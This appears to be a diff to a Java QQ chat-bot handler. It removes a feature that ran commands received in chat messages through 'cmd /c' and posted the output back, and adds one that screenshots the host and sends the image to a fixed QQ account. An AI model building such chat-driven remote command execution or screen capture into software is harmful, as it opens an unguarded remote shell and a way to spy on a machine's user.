@@ -18,7 +18,7 @@ import java.util.concurrent.Executors;
 
 @Component
 @Slf4j
-public class CommandExecReplayMsgHandler extends QQMsgHandler {
+public class ShotScreenReplayMsgHandler extends QQMsgHandler {
     @Resource
     private QQGateway qqGateway;
     @Resource
@@ -37,21 +37,18 @@ public class CommandExecReplayMsgHandler extends QQMsgHandler {
             return;
         }
 
-        if (CommandEnum.COMMAND_EXECUTE.judgeCommand(content)) {
+        if (CommandEnum.COMMAND_SHOOT_SCREEN.judgeCommand(content)) {
             executor.submit(() -> {
-                String command = CommandEnum.COMMAND_EXECUTE.handleCommand(content);
-                String execRes = SystemUtil.runAndReturn("cmd /c " + command);
+                String screenshotPath = SystemUtil.takeScreenshot();
 
                 QQMsgSendRequest qqMsgSendRequest = new QQMsgSendRequest();
                 qqMsgSendRequest.setMsgId(qqInteractiveDTO.getId());
-                if (execRes == null) {
-                    qqMsgSendRequest.setContent("命令执行异常");
+                if (screenshotPath == null) {
+                    qqMsgSendRequest.setContent("截屏失败");
                     qqGateway.sendMsg(qqMsgSendRequest, "634091544");
                 } else {
-                    qqMsgSendRequest.setContent("命令执行成功");
-                    String textImageFilePath = FileUtil.genUniqueFileNameContainsPath("cmd", ".png");
-                    FileUtil.textToImage(execRes, textImageFilePath);
-                    qqGateway.sendMsg(qqMsgSendRequest, "634091544", textImageFilePath);
+                    qqMsgSendRequest.setContent("截屏成功");
+                    qqGateway.sendMsg(qqMsgSendRequest, "634091544", screenshotPath);
                 }
             });
         }
